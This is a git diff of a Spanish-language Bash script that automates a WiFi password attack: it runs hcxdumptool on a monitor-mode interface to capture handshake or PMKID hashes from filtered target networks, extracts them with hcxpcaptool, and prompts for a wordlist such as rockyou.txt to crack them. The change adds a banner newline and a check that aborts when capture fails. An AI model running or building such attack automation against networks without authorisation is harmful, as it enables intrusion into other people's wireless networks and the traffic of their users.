@@ -13,7 +13,7 @@ purpleColour="\e[0;35m\033[1m"
 turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 
-echo -e """${turquoiseColour}db   dD d888888b d8888b. .d8888. d888888b d88888b  .d8b.  db      d88888b d8888b. """
+echo -e """\n${turquoiseColour}db   dD d888888b d8888b. .d8888. d888888b d88888b  .d8b.  db      d88888b d8888b. """
 echo -e """88 ,8P'   \`88'   88  \`8D 88'  YP \`~~88~~' 88'     d8' \`8b 88      88'     88  \`8D """
 echo -e """88,8P      88    88   88 \`8bo.      88    88ooooo 88ooo88 88      88ooooo 88oobY' """
 echo -e """88\`8b      88    88   88   \`Y8b.    88    88~~~~~ 88~~~88 88      88~~~~~ 88\`8b   """
@@ -35,7 +35,13 @@ echo -e "${redColour}[!]${endColour} ${blueColour}Pulsa Ctrl+C cuando aparezca $
 ./hcxdumptool/hcxdumptool -i $mondev -o hash.tmp --filterlist=filter.txt --filtermode=2 --enable_status=1
 
 echo -e "\n${turquoiseColour}[*]${endColour} ${blueColour}Extrayendo hash de la captura...${endColour}" && sleep 2
-./hcxtools/hcxpcaptool -z pass hash.tmp && echo -e "\n${greenColour}[✓]${endColour} ${blueColour}¡Hecho!\n${endColour}" && sleep 2
+./hcxtools/hcxpcaptool -z pass hash.tmp
+if [ ! -f pass ]; then
+	echo -e "\n${redColour}[!] La captura no se ha efectuado con éxito${endColour}\n"
+	rm filter.txt hash.tmp
+	exit
+fi
+echo -e "\n${greenColour}[✓]${endColour} ${blueColour}¡Hecho!\n${endColour}" && sleep 2
 
 echo -ne "${yellowColour}[?]${endColour} ${blueColour}Selecciona un diccionario para el ataque (rockyou.txt por defecto):${endColour} " && read dicc
 if [ -z "$dicc" ]; then dicc="/usr/share/wordlists/rockyou.txt"; fi
